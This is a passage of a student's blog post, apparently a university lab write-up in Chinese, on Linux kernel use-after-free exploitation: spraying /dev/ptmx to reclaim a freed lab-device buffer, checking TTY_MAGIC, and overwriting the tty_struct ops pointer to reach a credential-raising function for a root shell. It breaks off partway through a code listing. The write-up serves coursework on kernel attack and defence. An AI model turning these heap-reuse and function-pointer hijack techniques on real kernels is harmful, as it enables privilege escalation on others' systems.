@@ -1,0 +1,424 @@
+<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="JOP | Linux kernel attack and defence"><title>JOP | Linux内核攻防</title><link rel=canonical href=https://unicocn.github.io/p/jop/><link rel=stylesheet href=/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css><meta property="og:title" content="JOP | Linux内核攻防"><meta property="og:description" content="JOP | Linux kernel attack and defence"><meta property="og:url" content="https://unicocn.github.io/p/jop/"><meta property="og:site_name" content="Jiacheng Hu"><meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="Security"><meta property="article:tag" content="Technology"><meta property="article:tag" content="Linux"><meta property="article:published_time" content="2023-06-07T23:50:00+00:00"><meta property="article:modified_time" content="2023-06-07T23:50:00+00:00"><meta property="og:image" content="https://unicocn.github.io/p/jop/cover.jpg"><meta name=twitter:title content="JOP | Linux内核攻防"><meta name=twitter:description content="JOP | Linux kernel attack and defence"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://unicocn.github.io/p/jop/cover.jpg"><link rel="shortcut icon" href=/favicon.ico></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu1d23554e556787a34573de33aaa6d534_25919_300x0_resize_box_3.png width=300 height=300 class=site-logo loading=lazy alt=Avatar></a>
+<span class=emoji>🇨🇳</span></figure><div class=site-meta><h1 class=site-name><a href=/>Jiacheng Hu</a></h1><h2 class=site-description>Student - Backend Developer - Blogger</h2></div></header><ol class=social-menu><li><a href=https://github.com/UnicoCN target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg><span>Home</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>Search</span></a></li><li><a href=/about-me/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg><span>About Me</span></a></li><div class=menu-bottom-section><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><span>Dark Mode</span></li></div></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#思考题1>思考题1</a></li><li><a href=#task1设备接口的使用--思考题2>Task1：设备接口的使用 & 思考题2</a></li><li><a href=#task2简单获取root-shell--思考题3>Task2：简单获取root shell & 思考题3</a></li><li><a href=#task3gadget获取root-shell--思考题4>Task3：gadget获取root shell & 思考题4</a></li><li><a href=#task4内核cfi保护>Task4：内核CFI保护</a></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/jop/><img src=/p/jop/cover_hu5b167a362bf183fa776f2ef90b695ed1_16596_800x0_resize_q75_box.jpg srcset="/p/jop/cover_hu5b167a362bf183fa776f2ef90b695ed1_16596_800x0_resize_q75_box.jpg 800w, /p/jop/cover_hu5b167a362bf183fa776f2ef90b695ed1_16596_1600x0_resize_q75_box.jpg 1600w" width=800 height=448 loading=lazy alt="Featured image of post JOP | Linux内核攻防"></a></div><div class=article-details><header class=article-category><a href=/categories/study/ style=background-color:#2a9d8f;color:#fff>Study</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/jop/>JOP | Linux内核攻防</a></h2><h3 class=article-subtitle>JOP | Linux kernel attack and defence</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Jun 07, 2023</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>6 minute read</time></div></footer></div></header><section class=article-content><h1 id=lab3-jop--linux内核漏洞攻防>Lab3 JOP | Linux内核漏洞攻防</h1><blockquote><p>Link: <a class=link href=https://zjusec.gitee.io/syssec23-stu/lab3/ target=_blank rel=noopener>https://zjusec.gitee.io/syssec23-stu/lab3/</a></p></blockquote><h2 id=思考题1>思考题1</h2><blockquote><p>Q1. 为什么在堆上分配相同大小内存的时候，两次分配的内存地址会一样</p></blockquote><p>Linux内核在堆上分配内存时，通常会使用如下系统调用</p><ul><li>malloc(分配小块内存时调用)<ul><li>brk：将数据段(.data)的最高地址指针<code>_edata</code>往高地址推（从堆头开始，参数为地址）</li><li>sbrk：将地址指针往高地址推（从当前指针位置开始，参数为指针增量）</li></ul></li><li>mmap(默认分配大于128k内存时调用)</li></ul><p>由于频繁的分配释放内存容易产生碎片，并且会影响性能，因此Linux引入了基于内存池的内存管理方式，堆内存的分配和回收进行统一管理，对于每一块内存称之为chunk</p><p>被用户free掉的chunk，通过指针连接成链表，不同大小的内存连接成不同的链表，每一个链表称之为bin，当再次需要分配某一个大小的内存时，就在对应大小的chunk连接成的bin中分配即可，进而减少碎片，也可以提高内存分配效率</p><p>因此当我们在堆上分配相同大小内存时，被free的内存被接入bin中，再次分配相同大小的内存就会从bin上分配，进而极大增加了分配到的内存地址相同的概率；这也就解释了为什么在UAF利用中，两次分配的内存地址会一样</p><h2 id=task1设备接口的使用--思考题2>Task1：设备接口的使用 & 思考题2</h2><ol><li>根据UAF的原理，我们先两次打开<code>/dev/zjudev</code>设备，分配并释放大小为<code>sizeof(tty_struct)</code>的缓冲区，这样做是为了之后打开<code>/dev/ptmx</code>设备，分配<code>tty_struct</code>结构体时能够分配到与<code>/dev/zjudev</code>相同地址的缓冲区</li><li>之后我们打开<code>/dev/ptmx</code>设备，并判断是否分配到了与<code>/dev/zjudev</code>相同的缓冲区；判断的方法是，我们观察<code>tty_struct</code>结构体：</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>tty_struct</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=kt>int</span>	<span class=n>magic</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>kref</span> <span class=n>kref</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>device</span> <span class=o>*</span><span class=n>dev</span><span class=p>;</span>	<span class=cm>/* class device or NULL (e.g. ptys, serdev) */</span>
+</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>tty_driver</span> <span class=o>*</span><span class=n>driver</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>const</span> <span class=k>struct</span> <span class=n>tty_operations</span> <span class=o>*</span><span class=n>ops</span>
+</span></span><span class=line><span class=cl><span class=c1>// ...
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cm>/* tty magic number */</span>
+</span></span><span class=line><span class=cl><span class=cp>#define TTY_MAGIC		0x5401
+</span></span></span></code></pre></td></tr></table></div></div><p>在结构体的起始地址有一个<code>magic</code>变量，其值会被初始化成<code>0x5401</code>，而我们尽管不知道<code>tty_struct</code>结构体的地址，但是可以通过读取<code>/dev/zjudev</code>分配的缓冲区内容，判断最开始的四个字节是否为<code>0x5401</code>即可</p><ol start=3><li>具体实现上，可以使用一个死循环，不断打开<code>/dev/ptmx</code>设备，判断<code>/dev/zjudev</code>的缓冲区内容是否为<code>0x5401</code>，当结果为是，则跳出循环，返回<code>ptmx</code>的文件描述符</li><li>之后，我们就可以通过调用<code>/dev/zjudev</code>设备的<code>write</code>接口，修改缓冲区内容，进而修改<code>tty_struct</code>结构体的内容</li></ol><blockquote><p>Q2. 如何确定自己所控制的指针一定被分配给<code> tty_struct</code>结构体</p></blockquote><p>见之前的分析，通过<code>tty_struct</code>结构体开头的<code>magic</code>变量的值进行判断</p><p>附代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=cp>#define TTY_STRUCT_SIZE 0x2B8
+</span></span></span><span class=line><span class=cl><span class=cp>#define TTY_MAGIC 0x5401
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=n>size_t</span> <span class=n>tty_op_buf</span><span class=p>[</span><span class=mi>36</span><span class=p>];</span>
+</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>tty_buf</span><span class=p>[</span><span class=n>TTY_STRUCT_SIZE</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>init_dev</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>dev1</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/dev/zjudev&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>dev2</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/dev/zjudev&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>ioctl</span><span class=p>(</span><span class=n>dev1</span><span class=p>,</span> <span class=mh>0x0001</span><span class=p>,</span> <span class=n>TTY_STRUCT_SIZE</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>close</span><span class=p>(</span><span class=n>dev1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>dev2</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>init_ptmx</span><span class=p>(</span><span class=kt>int</span> <span class=n>dev_fd</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>ptmx_fd</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(;;)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>ptmx_fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/dev/ptmx&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span> <span class=o>|</span> <span class=n>O_NOCTTY</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>memset</span><span class=p>(</span><span class=n>tty_buf</span><span class=p>,</span> <span class=sc>&#39;\0&#39;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>tty_buf</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=n>read</span><span class=p>(</span><span class=n>dev_fd</span><span class=p>,</span> <span class=n>tty_buf</span><span class=p>,</span> <span class=n>TTY_STRUCT_SIZE</span> <span class=o>-</span> <span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>size_t</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>TTY_STRUCT_SIZE</span><span class=p>;</span> <span class=n>i</span> <span class=o>+=</span> <span class=mi>8</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=kt>char</span> <span class=n>v_str</span><span class=p>[</span><span class=mi>9</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>            <span class=n>memcpy</span><span class=p>(</span><span class=n>v_str</span><span class=p>,</span> <span class=n>tty_buf</span> <span class=o>+</span> <span class=n>i</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=n>v_str</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=n>printf</span><span class=p>(</span><span class=s>&#34;tty_buf + %lu = 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=o>*</span><span class=p>(</span><span class=n>size_t</span><span class=o>*</span><span class=p>)</span><span class=n>v_str</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=n>size_t</span> <span class=n>magic</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=n>memcpy</span><span class=p>(</span><span class=o>&amp;</span><span class=n>magic</span><span class=p>,</span> <span class=n>tty_buf</span><span class=p>,</span> <span class=mi>4</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>magic</span> <span class=o>==</span> <span class=n>TTY_MAGIC</span><span class=p>)</span> <span class=k>break</span><span class=p>;</span> 
+</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;TTY_MAGIC match! ptmx_fd = %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>ptmx_fd</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>ptmx_fd</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[])</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>dev_fd</span> <span class=o>=</span> <span class=n>init_dev</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>ptmx_fd</span> <span class=o>=</span> <span class=n>init_ptmx</span><span class=p>(</span><span class=n>dev_fd</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=task2简单获取root-shell--思考题3>Task2：简单获取root shell & 思考题3</h2><ol><li>观察<code>tty_struct</code>结构体，我们可以发现有一个<code>const struct tty_operations* ops</code>指针，其指向的是一组可以被调用的函数指针，当我们对<code>/dev/ptmx</code>设备进行操作时，调用的就是其中的函数；<code>struct tty_operations</code>的具体结构如下：</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>tty_operations</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=p>(</span><span class=o>*</span><span class=n>lookup</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_driver</span> <span class=o>*</span><span class=n>driver</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>			<span class=k>struct</span> <span class=n>file</span> <span class=o>*</span><span class=n>filp</span><span class=p>,</span> <span class=kt>int</span> <span class=n>idx</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=kt>int</span>  <span class=p>(</span><span class=o>*</span><span class=n>install</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_driver</span> <span class=o>*</span><span class=n>driver</span><span class=p>,</span> <span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span><span class=n>tty</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>remove</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_driver</span> <span class=o>*</span><span class=n>driver</span><span class=p>,</span> <span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span><span class=n>tty</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=kt>int</span>  <span class=p>(</span><span class=o>*</span><span class=n>open</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span> <span class=k>struct</span> <span class=n>file</span> <span class=o>*</span> <span class=n>filp</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>close</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span> <span class=k>struct</span> <span class=n>file</span> <span class=o>*</span> <span class=n>filp</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>shutdown</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span><span class=n>tty</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=c1>// ...
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>由于我们之前使得<code>tty_struct</code>的地址和<code>/dev/zjudev</code>中分配的缓冲区起始地址相同，那么我们就可以通过覆写缓冲区进而修改<code>ops</code>指针的值，而我们完全可以将<code>ops</code>指向一块大小和<code>tty_operations</code>相同的区域，但里面的函数指针全都指向<code>hack_cred</code>函数的地址，那么我们就可以通过调用<code>/dev/ptmx</code>设备的方法，进而调用<code>hack_cred</code>函数，获取root权限</li><li>首先我们需要获得<code>hack_cred</code>的函数地址，由于没有开始ASLR，因此直接在<code>System.map</code>里面查表即可</li></ol><p><img src=/p/jop/image-20230606192029887.png width=475 height=45 srcset="/p/jop/image-20230606192029887_hud3e3b0f42cad2c8d4d5e4b02d0bbbb7a_5073_480x0_resize_box_3.png 480w, /p/jop/image-20230606192029887_hud3e3b0f42cad2c8d4d5e4b02d0bbbb7a_5073_1024x0_resize_box_3.png 1024w" loading=lazy alt="image 1" class=gallery-image data-flex-grow=1055 data-flex-basis=2533px></p><ol start=4><li>可以看到<code>tty_operations</code>中共有36个函数指针，每个函数指针大小为8B，因此我们创建一个大小为36*8B的数组<code>tty_op_buf</code>，其中所有函数指针都指向<code>hack_cred</code>，之后获取<code>ptr = &amp;tty_op_buf</code>，将<code>ptr</code>覆盖<code>ops</code>指针，进而调用<code>hack_cred</code></li></ol><blockquote><p>Q3. 为什么不能直接通过 UAF 控制 cred 结构体直接修改其内容？有没有办法能够通过 UAF 来利用新版本的 cred 结构体呢？</p></blockquote><p>在Linux kernel 4.5版本之前是可以的，但是在Linux kernel 4.5版本及之后就不可以了，可以比较kernel 4.5版本对<code>cred_init</code>函数的修改(参考了https://zhuanlan.zhihu.com/p/437464189)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=mf>4.4.72</span>
+</span></span><span class=line><span class=cl><span class=cm>/*
+</span></span></span><span class=line><span class=cl><span class=cm> * initialise the credentials stuff
+</span></span></span><span class=line><span class=cl><span class=cm> */</span>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=n>__init</span> <span class=nf>cred_init</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=cm>/* allocate a slab in which we can store credentials */</span>
+</span></span><span class=line><span class=cl>    <span class=n>cred_jar</span> <span class=o>=</span> <span class=nf>kmem_cache_create</span><span class=p>(</span><span class=s>&#34;cred_jar&#34;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>                     <span class=mi>0</span><span class=p>,</span> <span class=n>SLAB_HWCACHE_ALIGN</span><span class=o>|</span><span class=n>SLAB_PANIC</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=mf>4.5</span>
+</span></span><span class=line><span class=cl><span class=cm>/*
+</span></span></span><span class=line><span class=cl><span class=cm> * initialise the credentials stuff
+</span></span></span><span class=line><span class=cl><span class=cm> */</span>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=n>__init</span> <span class=nf>cred_init</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=cm>/* allocate a slab in which we can store credentials */</span>
+</span></span><span class=line><span class=cl>    <span class=n>cred_jar</span> <span class=o>=</span> <span class=nf>kmem_cache_create</span><span class=p>(</span><span class=s>&#34;cred_jar&#34;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>    	<span class=mi>0</span><span class=p>,</span><span class=n>SLAB_HWCACHE_ALIGN</span><span class=o>|</span><span class=n>SLAB_PANIC</span><span class=o>|</span><span class=n>SLAB_ACCOUNT</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>可以注意到，在 slab 的创建 flag 中多了 一个 <code>SLAB_ACCOUNT</code>，意味着<code>cred_jar</code>和<code>kmalloc</code>不再合并，也就是说<code>cred</code>分配的内存和<code>kmalloc</code>分配的内存来自两个不同的区域，因此无法使得通过<code>kmalloc</code>分配的内存和分配给<code>cred</code>的内存拥有相同的起始地址，也就无法通过UAF控制cred结构体</p><p>附代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
